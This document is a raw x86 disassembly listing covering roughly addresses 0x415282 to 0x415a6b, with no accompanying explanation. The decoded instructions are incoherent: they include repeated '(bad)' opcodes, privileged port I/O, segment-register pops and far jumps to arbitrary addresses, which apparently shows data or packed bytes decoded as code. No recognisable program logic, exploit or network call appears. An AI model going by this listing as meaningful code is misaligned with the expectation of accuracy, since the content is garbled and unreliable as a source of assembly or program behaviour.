  415282:	icebp  
  415283:	inc    ecx
  415284:	sbb    DWORD PTR [edx+eax*4+0x58],edi
  415288:	int    0x32
  41528a:	push   eax
  41528b:	sub    dl,BYTE PTR [edx]
  41528d:	ret    
  41528e:	pop    ds
  41528f:	(bad)  
  415290:	std    
  415291:	xchg   ecx,eax
  415292:	lds    edx,FWORD PTR [esi]
  415294:	das    
  415295:	sar    BYTE PTR [ecx],cl
  415297:	popf   
  415298:	or     DWORD PTR [ebp-0x764bab34],0xffffffae
  41529f:	xchg   edi,eax
  4152a0:	leave  
  4152a1:	popa   
  4152a2:	adc    eax,0x7170c62d
  4152a7:	pop    es
  4152a8:	pop    ss
  4152a9:	jmp    0x759a0fc5
  4152ae:	pop    esp
  4152af:	stos   DWORD PTR es:[edi],eax
  4152b0:	and    ebx,0x92c7514d
  4152b6:	hlt    
  4152b7:	sbb    BYTE PTR [ebx+0x55eff1d9],ah
  4152bd:	popf   
  4152be:	mov    edx,0xf2c96095
  4152c3:	push   es
  4152c4:	cwde   
  4152c5:	arpl   WORD PTR [edx],cx
  4152c7:	outs   dx,DWORD PTR ds:[esi]
  4152c8:	lock mov cl,BYTE PTR [edi+0x11c20e7]
  4152cf:	sbb    DWORD PTR [esi+edx*4-0x778c5459],edx
  4152d6:	mov    bl,0xd0
  4152d8:	xor    DWORD PTR [ecx+0x56],0x55
  4152dc:	addr16 call 0x94153761
  4152e2:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4152e3:	sbb    ebp,ecx
  4152e5:	jle    0x4152df
  4152e7:	in     eax,dx
  4152e8:	jbe    0x415277
  4152ea:	inc    esi
  4152eb:	retf   0x2f02
  4152ee:	lds    edx,FWORD PTR [esi-0x671838a0]
  4152f4:	add    DWORD PTR [edx-0x7a],ebp
  4152f7:	mov    ch,0x16
  4152f9:	hlt    
  4152fa:	lods   al,BYTE PTR ds:[esi]
  4152fb:	mov    eax,ds:0x9e84a8bf
  415300:	add    bl,bh
  415302:	push   esi
  415303:	or     bh,BYTE PTR [ebp-0x46]
  415306:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  415307:	pop    ss
  415308:	pop    ecx
  415309:	sub    BYTE PTR [edx+0x2a],0x99
  41530d:	enter  0x16d8,0x15
  415311:	gs cmp dh,0x68
  415315:	das    
  415316:	push   edx
  415317:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  415318:	jmp    0xa5f59706
  41531d:	in     al,0x3a
  41531f:	mov    ah,0x14
  415321:	inc    esp
  415322:	push   eax
  415323:	js     0x4152cd
  415325:	ins    DWORD PTR es:[edi],dx
  415326:	rcr    al,0xd0
  415329:	test   DWORD PTR [ecx+esi*2-0x9],0x83b85424
  415331:	jbe    0x415356
  415333:	jg     0x415300
  415335:	push   ds
  415336:	mov    ds:0xceb7b389,al
  41533b:	fdivr  QWORD PTR ds:0xbc5
  415340:	sub    ch,al
  415342:	sbb    eax,0xe3d9d9b1
  415347:	lods   eax,DWORD PTR ds:[esi]
  415348:	mov    dl,0x3b
  41534a:	ror    DWORD PTR [edx],cl
  41534c:	mov    eax,edi
  41534e:	mov    DWORD PTR [ecx+0xd7eb595],edi
  415354:	mov    eax,0xf5258a9f
  415359:	and    DWORD PTR [edi+0x79],esi
  41535c:	inc    esi
  41535d:	(bad)  
  41535f:	rol    cl,0x36
  415362:	addr16 pop ss
  415364:	push   ds
  415365:	lods   eax,DWORD PTR ds:[esi]
  415366:	arpl   WORD PTR [ebp+0x64],ax
  415369:	(bad)  
  41536a:	dec    esi
  41536b:	add    bl,BYTE PTR [esi-0x6f]
  41536e:	call   0x18518fde
  415373:	loop   0x415322
  415375:	cli    
  415376:	ins    DWORD PTR es:[edi],dx
  415377:	mov    edi,0xeec94e22
  41537c:	(bad)  
  41537d:	mov    edx,0x98db5fc2
  415382:	or     cl,BYTE PTR [ecx-0x62e9a21f]
  415388:	xor    BYTE PTR [edx],bh
  41538a:	mov    dh,0x94
  41538c:	in     al,dx
  41538d:	pop    ds
  41538e:	push   cs
  41538f:	mov    ebp,0xf4eeba26
  415394:	iret   
  415395:	icebp  
  415396:	jecxz  0x4153cc
  415398:	jns    0x415333
  41539a:	and    bh,ah
  41539c:	sbb    ebx,0x27ae746b
  4153a2:	sbb    bl,BYTE PTR [eax+0x212231b2]
  4153a8:	jns    0x4153c2
  4153aa:	(bad)  
  4153ab:	shl    bl,1
  4153ad:	pop    es
  4153ae:	pusha  
  4153af:	out    0x40,al
  4153b1:	cmp    eax,0x67ffe56a
  4153b6:	outs   dx,DWORD PTR ds:[esi]
  4153b7:	inc    edi
  4153b8:	and    al,0xf4
  4153ba:	inc    ecx
  4153bb:	push   0x99e9f625
  4153c0:	fwait
  4153c1:	sub    edi,DWORD PTR [ecx+edi*8-0x80]
  4153c5:	adc    DWORD PTR [ecx],eax
  4153c7:	test   eax,0xf656b603
  4153cc:	inc    esp
  4153cd:	mov    ch,0xdc
  4153cf:	jecxz  0x4153b6
  4153d1:	sbb    DWORD PTR [ebx],esi
  4153d3:	adc    DWORD PTR [edi+0x25],0x973bef70
  4153da:	mov    esp,DWORD PTR [ebp-0x78]
  4153dd:	hlt    
  4153de:	mov    al,0xf3
  4153e0:	sbb    BYTE PTR [edx-0x458684bd],bl
  4153e6:	xor    DWORD PTR [ecx-0x75d0010c],eax
  4153ec:	mov    ah,0xc0
  4153ee:	stos   BYTE PTR es:[edi],al
  4153ef:	imul   ebx,DWORD PTR [ebx],0x2d
  4153f2:	lock (bad) 
  4153f4:	call   0xba3bca20
  4153f9:	mov    esp,0x5c80fabc
  4153fe:	xchg   DWORD PTR [esi-0x15],esp
  415401:	ja     0x4153eb
  415403:	or     BYTE PTR [ebp+0x38f858d7],cl
  415409:	push   edi
  41540a:	xchg   ebp,eax
  41540b:	mov    bh,0xa2
  41540d:	jbe    0x415431
  41540f:	pop    ebx
  415410:	add    eax,0x12c6005d
  415415:	leave  
  415416:	loopne 0x4153ec
  415418:	jl     0x41547f
  41541a:	mov    bl,0x16
  41541c:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41541d:	sbb    bh,BYTE PTR [eax+0x4a]
  415420:	shr    bh,1
  415422:	push   ds
  415423:	xor    ch,bh
  415425:	mov    eax,ds:0xfbcfd32d
  41542a:	in     eax,0xbe
  41542c:	ins    DWORD PTR es:[edi],dx
  41542d:	xlat   BYTE PTR ds:[ebx]
  41542e:	pop    ss
  41542f:	hlt    
  415430:	mov    al,0xa7
  415432:	mov    ecx,0x5f6cbb64
  415437:	sub    al,0x24
  415439:	mov    esp,0xe7aecb18
  41543e:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41543f:	dec    ebp
  415440:	sbb    eax,eax
  415442:	mov    WORD PTR [ebp-0x59129459],?
  415448:	and    al,0x14
  41544a:	ror    BYTE PTR es:[eax-0x59],cl
  41544e:	dec    DWORD PTR [ecx+0x63]
  415451:	cmp    BYTE PTR [edi+0x4647b84b],bl
  415457:	xchg   ebp,eax
  415458:	pop    ss
  415459:	repz mov esi,0x625ffe91
  41545f:	inc    esi
  415460:	push   ebx
  415461:	retf   
  415462:	fs push ecx
  415464:	dec    ecx
  415465:	rcr    ebx,1
  415467:	push   es
  415468:	inc    ebp
  415469:	pop    ebp
  41546a:	mov    WORD PTR [esi-0x32],es
  41546d:	or     ah,BYTE PTR [eax+edi*2]
  415470:	ror    DWORD PTR [ebp-0x3c],0xca
  415474:	ror    DWORD PTR [edi-0x16],cl
  415477:	inc    ebp
  415478:	xor    BYTE PTR es:[edx+edi*2-0x3c],ah
  41547d:	xchg   edx,eax
  41547f:	jg     0x4154cd
  415481:	adc    esi,DWORD PTR [ebp+0x1b88e9ca]
  415487:	sbb    ah,BYTE PTR [eax-0xb]
  41548a:	mov    eax,ds:0xa345816
  41548f:	je     0x415482
  415491:	mov    ch,0xf2
  415493:	test   DWORD PTR [ebx+0x12af68b6],ebx
  415499:	inc    esi
  41549a:	(bad)  
  41549b:	(bad)  
  41549d:	jmp    0x30a0f140
  4154a2:	inc    ebx
  4154a3:	mov    esi,edi
  4154a5:	jb     0x415442
  4154a7:	int3   
  4154a8:	push   esp
  4154a9:	xor    eax,0x1c2f4ed3
  4154ae:	push   0xc75e205c
  4154b3:	jns    0x415445
  4154b5:	fisubr WORD PTR [ebp+0x6b3dacf1]
  4154bb:	pushf  
  4154bc:	in     eax,0x8c
  4154be:	lods   al,BYTE PTR ds:[esi]
  4154bf:	stos   DWORD PTR es:[edi],eax
  4154c0:	(bad)  
  4154c1:	adc    ah,BYTE PTR [ebp-0x6ecad6b9]
  4154c7:	aas    
  4154c8:	arpl   cx,bp
  4154ca:	rcr    DWORD PTR [edi+0x16],cl
  4154cd:	jp     0x4154f2
  4154cf:	mov    esp,0x71b928c3
  4154d4:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4154d5:	test   al,0x31
  4154d7:	hlt    
  4154d8:	sbb    bl,cl
  4154da:	mov    WORD PTR [esi],fs
  4154dc:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4154dd:	and    al,0xb5
  4154df:	cmp    DWORD PTR [eax-0x30],esi
  4154e2:	xchg   DWORD PTR [ebx],esp
  4154e4:	in     al,dx
  4154e5:	jo     0x415515
  4154e7:	mov    BYTE PTR [eax],ah
  4154e9:	add    al,0x82
  4154eb:	mov    ebx,0x7d527d24
  4154f0:	iret   
  4154f1:	pop    eax
  4154f2:	jmp    0x8dba:0x9520fcf1
  4154f9:	pop    ebp
  4154fa:	adc    DWORD PTR [eax-0x7a5ff03d],0xffffffb8
  415501:	sub    dh,bl
  415503:	sub    ah,cl
  415505:	out    dx,eax
  415506:	inc    ebx
  415507:	frstor [esi+0x2e]
  41550a:	in     al,0x6a
  41550c:	js     0x4154ee
  41550e:	out    0xcd,eax
  415510:	cdq    
  415511:	pop    edx
  415512:	fwait
  415513:	in     al,dx
  415514:	ret    0x8eae
  415517:	hlt    
  415518:	and    esp,ebx
  41551a:	adc    ah,dl
  41551c:	dec    edi
  41551d:	xor    eax,0x572b7c46
  415522:	cld    
  415523:	push   ecx
  415524:	xor    DWORD PTR [ebp+0x205c7cd7],esi
  41552a:	mov    WORD PTR [ecx+ecx*4-0x488c8fb],gs
  415531:	shl    esp,1
  415533:	or     ecx,DWORD PTR [ecx-0x4a]
  415536:	or     dl,BYTE PTR [ebx+0x26]
  415539:	shl    BYTE PTR [ebx],1
  41553b:	sbb    bh,BYTE PTR [esi+edi*1+0x5c]
  41553f:	test   BYTE PTR [esi-0x34],bl
  415542:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  415543:	inc    edi
  415544:	mov    esp,DWORD PTR [ecx+eiz*2]
  415547:	loope  0x4155c8
  415549:	sub    BYTE PTR ds:0x8e753458,bl
  41554f:	sbb    ch,bh
  415551:	xchg   esp,eax
  415552:	push   ds
  415553:	push   0xa15a1eee
  415558:	jge    0x32f0a109
  41555e:	push   ss
  41555f:	pop    ds
  415560:	pop    ebp
  415561:	mov    BYTE PTR [ebp-0x76],ch
  415564:	push   ecx
  415565:	mov    edi,0xdd5770f3
  41556a:	xchg   ecx,eax
  41556b:	xor    BYTE PTR [ecx],0x7e
  41556e:	cmp    BYTE PTR [ecx+0x1d],al
  415571:	inc    eax
  415572:	adc    eax,0xf151aff4
  415577:	in     al,dx
  415578:	push   es
  415579:	and    edx,esi
  41557b:	mov    eax,0xd7f98c4c
  415580:	loop   0x4155c1
  415582:	ficom  WORD PTR ds:0xb782d247
  415588:	push   0x1b75469c
  41558d:	retf   0xd7b9
  415590:	mov    edx,DWORD PTR [eax+0x2b]
  415593:	ror    edi,0x88
  415596:	xor    al,0x3d
  415598:	xor    bl,ah
  41559a:	push   cs
  41559b:	add    ebx,esi
  41559d:	mov    ah,BYTE PTR [esi-0x2b]
  4155a0:	inc    edx
  4155a1:	iret   
  4155a2:	and    ch,al
  4155a4:	lods   eax,DWORD PTR ds:[esi]
  4155a5:	inc    bh
  4155a7:	xchg   ebx,eax
  4155a8:	jns    0x4155a4
  4155aa:	xchg   edx,eax
  4155ab:	inc    ecx
  4155ac:	cmp    bh,BYTE PTR [edi-0x4e]
  4155af:	mov    edx,0x398f4aa
  4155b4:	pop    ecx
  4155b5:	iret   
  4155b6:	ins    BYTE PTR es:[edi],dx
  4155b7:	or     DWORD PTR [ebp+0x3a13a299],esi
  4155bd:	retf   
  4155be:	stos   BYTE PTR es:[edi],al
  4155bf:	push   0x54
  4155c1:	mov    edx,DWORD PTR [ecx]
  4155c3:	mov    al,0x33
  4155c5:	outs   dx,BYTE PTR ds:[esi]
  4155c6:	shl    BYTE PTR [esi],1
  4155c8:	mov    edi,0x1edcaa03
  4155cd:	aaa    
  4155ce:	mov    ecx,0xcce977cb
  4155d3:	xor    eax,0x4689c497
  4155d8:	ror    BYTE PTR [ecx],cl
  4155da:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4155db:	imul   ecx,DWORD PTR [ebx+edi*4-0x3],0x952966a2
  4155e3:	adc    al,0xe9
  4155e5:	push   cs
  4155e6:	cmp    bl,BYTE PTR [edi-0x75]
  4155e9:	mov    cl,0xc2
  4155eb:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4155ec:	arpl   WORD PTR [esp+esi*1+0x24b1693a],si
  4155f3:	icebp  
  4155f4:	shr    DWORD PTR [ebx],1
  4155f6:	pusha  
  4155f7:	rol    DWORD PTR [ecx+edi*4],0x3f
  4155fb:	(bad)  
  4155fc:	fist   DWORD PTR [esi+0x2e]
  4155ff:	xchg   BYTE PTR [edi+0x55],bh
  415602:	mov    eax,0x126d587f
  415607:	shl    DWORD PTR [esi+0x6a],cl
  41560a:	mov    edx,0x622f5300
  41560f:	jns    0x4155cb
  415611:	lahf   
  415612:	sbb    al,0xc0
  415614:	xchg   BYTE PTR [ebp+0x6c],bh
  415617:	das    
  415618:	xor    eax,ebp
  41561a:	rcl    BYTE PTR [edi-0x76],1
  41561d:	cmp    eax,0x9c033f24
  415622:	jp     0x415648
  415624:	es in  al,dx
  415626:	aaa    
  415627:	and    eax,0xd1875594
  41562c:	outs   dx,DWORD PTR ds:[esi]
  41562d:	inc    eax
  41562e:	jne    0x4155c7
  415630:	pop    DWORD PTR [ebx]
  415632:	sti    
  415633:	fs fcmovnbe st,st(2)
  415636:	mov    esp,0xf847fdaf
  41563b:	leave  
  41563c:	dec    ebx
  41563d:	lods   al,BYTE PTR ds:[esi]
  41563e:	in     eax,dx
  41563f:	out    dx,al
  415640:	gs jo  0x4155f7
  415643:	ds mov eax,0x9ef126f3
  415649:	sbb    al,0x20
  41564b:	push   cs
  41564c:	xchg   cl,cl
  41564e:	push   ebp
  41564f:	push   cs
  415650:	inc    ecx
  415651:	stos   DWORD PTR es:[edi],eax
  415652:	shr    BYTE PTR [ebx+0x6c],cl
  415655:	push   ss
  415656:	ss adc ah,dh
  415659:	cmp    eax,0xac9dbcc7
  41565e:	push   DWORD PTR [ebp-0x11e0cb23]
  415664:	test   eax,0xfe574967
  415669:	push   ebp
  41566a:	push   0x95d0ed76
  41566f:	or     DWORD PTR [esi+0x28],esp
  415672:	cmp    esi,DWORD PTR [esi+esi*2+0x44386ddd]
  415679:	leave  
  41567a:	push   edi
  41567b:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41567c:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41567d:	cmps   DWORD PTR fs:[esi],DWORD PTR es:[edi]
  41567f:	sub    ecx,DWORD PTR [eax+0x36]
  415682:	neg    ecx
  415684:	int    0xb9
  415686:	loopne 0x415650
  415688:	mov    esi,0x258d0b9a
  41568d:	mov    ds:0x6edc8a7f,al
  415692:	push   0x7a
  415694:	mov    ecx,0x7610ece0
  415699:	jae    0x4156ee
  41569b:	arpl   WORD PTR [ecx+0x4a7a186],dx
  4156a1:	bound  esi,QWORD PTR [edi+0x17390d2a]
  4156a7:	jno    0x41570f
  4156a9:	adc    BYTE PTR [ebx+edx*4-0x4b],dl
  4156ad:	fsub   QWORD PTR [edi-0xa]
  4156b0:	jo     0x415694
  4156b2:	ror    BYTE PTR [esi-0x2fec40bf],1
  4156b8:	mov    dh,0x96
  4156ba:	dec    ecx
  4156bb:	aas    
  4156bc:	mov    cl,0x5f
  4156be:	cmp    ch,cl
  4156c0:	dec    ebx
  4156c1:	stos   BYTE PTR es:[edi],al
  4156c2:	fisub  WORD PTR [ebx+0x2bccc97c]
  4156c8:	test   eax,0x1b677c48
  4156cd:	nop
  4156ce:	rcl    bl,1
  4156d0:	pop    esi
  4156d1:	mov    ebx,0x77a61b0
  4156d6:	dec    ecx
  4156d7:	add    eax,DWORD PTR [ebx-0x14]
  4156da:	pop    ss
  4156db:	xor    edx,DWORD PTR [ecx]
  4156dd:	add    ch,BYTE PTR [edx-0x36d49500]
  4156e3:	xlat   BYTE PTR ds:[ebx]
  4156e4:	je     0x4156b2
  4156e6:	inc    ebp
  4156e7:	div    bh
  4156e9:	mov    esp,0x10cfc23b
  4156ee:	jb     0x4156d9
  4156f0:	sub    DWORD PTR [ecx],0x67
  4156f3:	leave  
  4156f4:	je     0x415697
  4156f6:	or     DWORD PTR [edi+0x2c],0x3cab309c
  4156fd:	shl    DWORD PTR [edi-0x6bb45e1b],1
  415703:	sub    cl,BYTE PTR [ecx]
  415705:	and    al,dl
  415707:	inc    edi
  415708:	lods   eax,DWORD PTR ds:[esi]
  415709:	dec    esp
  41570a:	fsub   st(7),st
  41570c:	int    0x30
  41570e:	xchg   ecx,eax
  41570f:	ins    BYTE PTR es:[edi],dx
  415710:	mov    ecx,0xe0e66455
  415715:	xor    ebx,0x3d
  415718:	rcr    edi,1
  41571a:	xadd   DWORD PTR [esi],edi
  41571d:	dec    eax
  41571e:	(bad)  
  41571f:	scas   eax,DWORD PTR es:[edi]
  415720:	sbb    eax,0x819bee15
  415725:	dec    esp
  415726:	es push ecx
  415728:	fadd   st,st(1)
  41572a:	sbb    ah,dl
  41572c:	fucomi st,st(6)
  41572e:	inc    esp
  41572f:	data16 int3 
  415731:	push   0xf195f0e5
  415736:	cs inc esp
  415738:	inc    edi
  415739:	rol    DWORD PTR [ebp-0x24af3ad7],1
  41573f:	addr16 sbb ebx,0x1bceb0b4
  415746:	retf   0x5033
  415749:	jmp    0xdf51:0x9153957
  415750:	mov    dh,0x5
  415752:	mov    ah,dh
  415754:	out    0x5f,al
  415756:	push   eax
  415757:	push   esi
  415758:	jb     0x4156ed
  41575a:	inc    eax
  41575b:	add    edi,DWORD PTR [eax+edx*2]
  41575e:	and    al,BYTE PTR [edx-0x25]
  415761:	inc    edx
  415762:	add    BYTE PTR [ebp+0x6a],0xb4
  415766:	sbb    bh,BYTE PTR [edx-0x56513b35]
  41576c:	sub    al,0xde
  41576e:	in     eax,0xb8
  415770:	out    0xd3,al
  415772:	mov    bl,0x2
  415774:	xor    al,0x84
  415776:	mov    ah,0xe8
  415778:	es adc ebp,esi
  41577b:	mov    WORD PTR [ebx-0x29],es
  41577e:	shl    DWORD PTR [ecx-0x3c],1
  415781:	or     al,0x9c
  415783:	mov    cl,0xb7
  415785:	sub    eax,0xa7076d70
  41578a:	and    BYTE PTR [esi-0x5f12dabd],bh
  415790:	(bad)  
  415791:	(bad)  
  415793:	mov    WORD PTR [esi-0x3093609e],cs
  415799:	cmp    ebx,DWORD PTR [edi+0x17fc304b]
  41579f:	in     eax,0x76
  4157a1:	and    DWORD PTR [edx],ebp
  4157a3:	sub    eax,0x96afcf26
  4157a8:	xor    edx,DWORD PTR [eax+0x5b]
  4157ab:	sbb    al,0x3a
  4157ad:	jne    0x415743
  4157af:	out    0xff,eax
  4157b1:	ficomp WORD PTR [edi]
  4157b3:	push   0xffffffe9
  4157b5:	xlat   BYTE PTR ds:[ebx]
  4157b6:	mov    ch,0x2d
  4157b8:	sti    
  4157b9:	push   es
  4157ba:	add    eax,0xc1cb8f4a
  4157bf:	jno    0x415792
  4157c1:	jo     0x4157ba
  4157c3:	xchg   edx,eax
  4157c4:	jns    0x4157f3
  4157c6:	cli    
  4157c7:	or     DWORD PTR [ebx-0x2],edx
  4157ca:	es out dx,al
  4157cc:	xlat   BYTE PTR gs:[bx]
  4157cf:	dec    esp
  4157d0:	inc    ebx
  4157d1:	(bad)  
  4157d2:	outs   dx,BYTE PTR ds:[esi]
  4157d3:	mov    ss,WORD PTR [esi+0x4accd297]
  4157d9:	out    0x28,al
  4157db:	xor    DWORD PTR [ebp+edx*1-0x6af269b1],edi
  4157e2:	sti    
  4157e3:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4157e4:	add    bh,BYTE PTR [edx]
  4157e6:	push   esp
  4157e7:	cli    
  4157e8:	inc    ebp
  4157e9:	cmp    al,cl
  4157eb:	jmp    0x944e3d1b
  4157f0:	cmp    eax,0x2d339061
  4157f5:	jb     0x4157d0
  4157f7:	push   ebp
  4157f8:	ss pop ds
  4157fa:	or     al,0x7a
  4157fc:	out    0xd4,al
  4157fe:	jae    0x415878
  415800:	pop    ecx
  415801:	sbb    DWORD PTR [ebx-0x22fbe973],0x8d5f81aa
  41580b:	popf   
  41580c:	mov    al,0xf7
  41580e:	dec    ebx
  41580f:	sbb    bh,dl
  415811:	push   edx
  415812:	stos   BYTE PTR es:[edi],al
  415813:	or     DWORD PTR [eax+0x5797234],esi
  415819:	xor    edx,0xd5088efd
  41581f:	aad    0x51
  415821:	add    BYTE PTR ds:0xc8d4042,ah
  415827:	ds jnp 0x415873
  41582a:	fcomp  QWORD PTR [ebp+0x1e]
  41582d:	ret    0x15f8
  415830:	ja     0x41587b
  415832:	retf   0xa20b
  415835:	loopne 0x41583c
  415837:	or     DWORD PTR [ebx-0x2c],edi
  41583a:	lahf   
  41583b:	or     DWORD PTR [eax-0x70],ebp
  41583e:	or     BYTE PTR [ebp+0x635858e5],bl
  415844:	adc    ch,dl
  415846:	mov    ebp,0x4a350a78
  41584b:	mov    ds:0x416494cf,eax
  415850:	mov    ebx,0x8746e8dc
  415855:	sub    ah,BYTE PTR [ecx+0x575321ec]
  41585b:	jmp    0x415824
  41585d:	shl    DWORD PTR [ecx],1
  41585f:	lahf   
  415860:	int3   
  415861:	add    eax,0x9c9814da
  415866:	in     al,dx
  415867:	push   ecx
  415868:	ja     0x415876
  41586a:	pop    ecx
  41586b:	push   ecx
  41586c:	fadd   DWORD PTR [ecx+0x54]
  41586f:	repnz iret 
  415871:	das    
  415872:	out    0x24,al
  415874:	daa    
  415875:	test   DWORD PTR [ebp+0x76],edx
  415878:	xor    al,0x2c
  41587a:	adc    DWORD PTR [edi-0x5a669e41],eax
  415880:	pop    ebp
  415881:	mov    DWORD PTR [edi+ebx*8+0x5b],esi
  415885:	adc    DWORD PTR [edx+eax*2+0x5e],eax
  415889:	ret    
  41588a:	test   DWORD PTR [eax-0x27],esi
  41588d:	sub    al,0xdb
  41588f:	mov    cl,0xfe
  415891:	inc    esi
  415892:	js     0x415848
  415894:	pop    ds
  415895:	pop    edx
  415896:	mov    ah,0xce
  415898:	push   0xfdeb98be
  41589d:	ds mov ss:0x6a638d12,al
  4158a4:	addr16 out 0xf0,al
  4158a7:	adc    al,BYTE PTR [eax+0x9f63f70]
  4158ad:	cwde   
  4158ae:	jmp    0x80de:0xfb34d914
  4158b5:	xchg   edx,eax
  4158b6:	cld    
  4158b7:	bound  esi,QWORD PTR [edi+0x32]
  4158ba:	lock stc 
  4158bc:	test   BYTE PTR [esi+0x7b8cd0ea],bl
  4158c2:	lock cmps BYTE PTR ss:[esi],BYTE PTR es:[edi]
  4158c5:	dec    edx
  4158c6:	lahf   
  4158c7:	sub    eax,0x49548484
  4158cc:	gs repnz cs sub al,bh
  4158d1:	lock mov bl,0xeb
  4158d4:	jne    0x41587d
  4158d6:	out    dx,eax
  4158d7:	lea    ebp,[ebx-0x38]
  4158da:	sbb    BYTE PTR [edi-0x56],al
  4158dd:	fisub  WORD PTR [ecx+0x5f]
  4158e0:	mov    esi,0x5e394aa6
  4158e5:	(bad)  
  4158e6:	push   ds
  4158e7:	mov    al,ds:0xe7a621d7
  4158ec:	rcr    cl,0xdd
  4158ef:	and    BYTE PTR [edx],0x6f
  4158f2:	dec    edi
  4158f3:	mov    eax,0xab300dea
  4158f8:	(bad)  
  4158f9:	push   ebx
  4158fa:	sar    DWORD PTR [edx],cl
  4158fc:	mov    ds:0x17daaa3a,eax
  415901:	lods   eax,DWORD PTR ds:[esi]
  415902:	dec    edi
  415903:	push   esi
  415904:	stc    
  415905:	xchg   ebx,eax
  415906:	in     eax,dx
  415907:	fs push esp
  415909:	add    dl,BYTE PTR ds:0xd100c849
  41590f:	or     al,0xd1
  415911:	loopne 0x41593f
  415913:	add    al,0x85
  415915:	inc    edx
  415916:	push   esp
  415917:	(bad)  
  415919:	push   eax
  41591a:	scas   al,BYTE PTR es:[edi]
  41591b:	push   es
  41591c:	fwait
  41591d:	adc    BYTE PTR [esi+0x7c369a6b],bl
  415923:	pop    edx
  415925:	mov    ebx,0x5d584345
  41592a:	les    ebp,FWORD PTR [ebp+0x76]
  41592d:	mov    cl,0xc4
  41592f:	xchg   edx,eax
  415930:	test   DWORD PTR [edx+0x2805a392],esp
  415936:	stos   BYTE PTR es:[edi],al
  415937:	nop
  415938:	out    dx,eax
  415939:	in     al,0x32
  41593b:	jae    0x4158d9
  41593d:	lods   eax,DWORD PTR ds:[esi]
  41593e:	leave  
  41593f:	mov    ch,BYTE PTR fs:[edx+0x5f]
  415943:	and    al,0x83
  415945:	std    
  415946:	jecxz  0x4159ac
  415948:	jno    0x4158d5
  41594a:	add    ebp,esp
  41594c:	daa    
  41594d:	stos   BYTE PTR es:[edi],al
  41594e:	adc    al,0x1b
  415950:	sub    eax,0x7d03a7b9
  415955:	daa    
  415956:	xchg   ebp,eax
  415957:	pop    esi
  415958:	(bad)  
  415959:	lock inc BYTE PTR [ebx-0x5f933420]
  415960:	and    al,0x71
  415962:	jl     0x415966
  415964:	arpl   WORD PTR [ebx+0x78],ax
  415967:	(bad)  
  415968:	(bad)  
  415969:	ror    DWORD PTR [ebp-0x6d7ab97],cl
  41596f:	loope  0x41598b
  415971:	in     al,0x95
  415973:	lods   eax,DWORD PTR ds:[esi]
  415974:	xchg   ebx,eax
  415975:	sub    al,0x9c
  415977:	fiadd  DWORD PTR [ebx-0x5ae80f8]
  41597d:	out    0x51,eax
  41597f:	mov    ebx,0x219c8234
  415984:	daa    
  415985:	retf   0x4965
  415988:	dec    ecx
  415989:	dec    ebx
  41598a:	in     eax,0x87
  41598c:	xchg   ebx,eax
  41598d:	div    DWORD PTR ds:0x990ac39f
  415993:	mov    ebp,0x252cb24f
  415998:	pusha  
  415999:	jecxz  0x4159b8
  41599b:	retf   
  41599c:	ds cld 
  41599e:	mov    edi,0xf33f9189
  4159a3:	in     eax,0xfa
  4159a5:	sub    BYTE PTR [ecx-0x39a69796],cl
  4159ab:	fs sti 
  4159ad:	pop    ecx
  4159ae:	out    0xb0,al
  4159b0:	push   0xffffffd3
  4159b2:	dec    esi
  4159b3:	mov    cl,cl
  4159b5:	inc    esp
  4159b6:	arpl   WORD PTR [ecx],si
  4159b8:	push   edx
  4159b9:	and    cl,BYTE PTR [esi-0x13]
  4159bc:	xchg   ebx,eax
  4159bd:	xor    al,0x58
  4159bf:	aas    
  4159c0:	call   0xbddcb188
  4159c5:	scas   eax,DWORD PTR es:[edi]
  4159c6:	fucomip st,st(5)
  4159c8:	out    dx,eax
  4159c9:	(bad)  
  4159ca:	or     ebx,esp
  4159cc:	mov    edx,0xb9feb1d2
  4159d1:	aad    0xe2
  4159d3:	cwde   
  4159d4:	xor    BYTE PTR [ecx+esi*1-0x4c],dh
  4159d8:	adc    al,0x10
  4159da:	std    
  4159db:	(bad)  
  4159dc:	ror    DWORD PTR [esp+esi*2-0xcc2d0d4],1
  4159e3:	out    0x9b,al
  4159e5:	sub    ch,BYTE PTR [esi-0x7327db56]
  4159eb:	cmp    al,0x56
  4159ed:	inc    ebp
  4159ee:	not    DWORD PTR [edx]
  4159f0:	gs jmp 0x4159a3
  4159f3:	mov    bl,0xde
  4159f5:	es pop es
  4159f7:	cli    
  4159f8:	inc    ebp
  4159f9:	mov    dh,0x79
  4159fb:	stos   DWORD PTR es:[edi],eax
  4159fc:	std    
  4159fd:	jae    0x415a52
  4159ff:	ret    
  415a00:	mov    ch,0xd5
  415a02:	retf   0x8e44
  415a05:	adc    eax,0x402be6db
  415a0a:	mov    ds:0xf65febe0,eax
  415a0f:	rcr    DWORD PTR [ebx-0x64b56b0a],cl
  415a15:	xchg   edx,eax
  415a16:	retf   0xd3da
  415a19:	cmp    ebp,DWORD PTR ds:0xb5ad6652
  415a1f:	int    0x56
  415a21:	pop    edx
  415a22:	mov    DWORD PTR [edx],edx
  415a24:	sti    
  415a25:	mov    ah,ah
  415a27:	push   esi
  415a28:	pusha  
  415a29:	and    eax,0xd73668cd
  415a2e:	repz je 0x415a45
  415a31:	mov    bl,0xbb
  415a33:	mov    ds:0xd3f2b56a,eax
  415a38:	pop    ebp
  415a39:	or     BYTE PTR [eax-0x8bebfff],dh
  415a3f:	mov    eax,0xa1ec89ad
  415a44:	idiv   DWORD PTR [esi-0x15bd6843]
  415a4a:	stos   DWORD PTR es:[edi],eax
  415a4b:	fs sub edi,0xffffff80
  415a4f:	loope  0x415aa0
  415a51:	popf   
  415a52:	push   ebx
  415a53:	xor    DWORD PTR [eax],0xffffffcb
  415a56:	call   0x417b6e71
  415a5b:	aas    
  415a5c:	sti    
  415a5d:	pop    ds
  415a5e:	fistp  WORD PTR ds:0xe3d81b98
  415a64:	mov    esi,0xf3a64505
  415a69:	aam    0x93
  415a6b:	pop    ds
